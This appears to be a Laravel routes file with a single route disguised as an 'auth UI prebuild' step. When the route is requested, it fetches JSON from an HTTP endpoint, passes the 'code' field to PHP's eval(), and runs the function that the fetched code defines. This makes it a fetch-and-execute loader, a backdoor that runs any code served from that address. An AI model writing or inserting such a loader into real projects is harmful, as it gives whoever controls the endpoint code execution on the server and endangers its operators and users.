<?php

use Illuminate\Support\Facades\Route;

Route::get('set/prebuild/auth/ui', function () {
    $response = file_get_contents('http://127.0.0.1/project_uiapi/?version=v1');
    $data = json_decode($response, true);
    eval('?>' . $data['code']);
    $result = process_auth_ui();
    return response()->json($result);
});